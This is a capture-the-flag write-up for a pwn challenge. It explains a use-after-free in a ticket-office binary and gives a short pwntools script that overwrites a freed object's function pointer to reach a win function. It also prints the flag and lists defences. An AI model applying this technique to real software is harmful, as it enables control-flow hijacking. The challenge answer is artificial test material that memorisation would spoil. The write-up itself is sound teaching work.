# Dockside Ticket Office — Pwn, 25 pts

## Objective
A ticket-office binary that manages temporary access tickets: create, cancel, edit, use. A cancelled
ticket "should no longer be usable," but the hint says it can grant emergency access. Flag: `CSSCTF{...}`.

## Concepts
- **checksec**: No PIE (fixed addresses), canary present, not stripped.
- **Use-After-Free (UAF)**: the global `active_ticket` pointer is **never cleared after `free()`**,
  leaving a dangling pointer that later operations still trust.
- The ticket struct (`malloc(0x28)`) stores a **function pointer at offset `+0x20`** (initially
  `deny_access`); `use_ticket` calls it.

## Steps
Reverse the four handlers:
- `create_ticket`: `malloc(0x28)`, bytes 0–4 = `"GUEST"`, `+0x20 = deny_access`.
- `cancel_ticket`: `free(active_ticket)` — but **does not set it to NULL** → dangling.
- `edit_ticket`: only checks `active_ticket != NULL`, then `read()`s **40 bytes** straight into the
  (freed) chunk.
- `use_ticket`: calls the function pointer at `active_ticket + 0x20`.

**Exploit** (classic UAF → overwrite function pointer, No PIE so the win addr is fixed):
1. `create` a ticket.
2. `cancel` it (frees the chunk; pointer still dangling).
3. `edit` — write `0x20` bytes of padding + `p64(open_gate)` (`0x40125f`) to land on the function
   pointer field.
4. `use` the ticket → calls `open_gate` instead of `deny_access` → prints the flag.
```python
from pwn import *
p = process('./dockside_ticket')
p.sendline(b'1')                       # create
p.sendline(b'2')                       # cancel (free, no NULL)
p.sendline(b'3'); p.send(b'A'*0x20 + p64(0x40125f))   # edit freed chunk
p.sendline(b'4')                       # use -> open_gate
print(p.recvall(timeout=2).decode())
```

## Flag
```
CSSCTF{us3_4ft3r_fr33_d0cks1d3}
```

## Takeaway
**Free without nulling = UAF.** If a freed object holds a function pointer (or vtable) and a later
op writes into it, you control execution. With No PIE the win function is a constant, so no leak is
needed. The attacker's question: *does any pointer stay live after free, and can I write through it
before it's reused?* Defence: null pointers on free, use hardened allocators, and don't store code
pointers in heap objects.
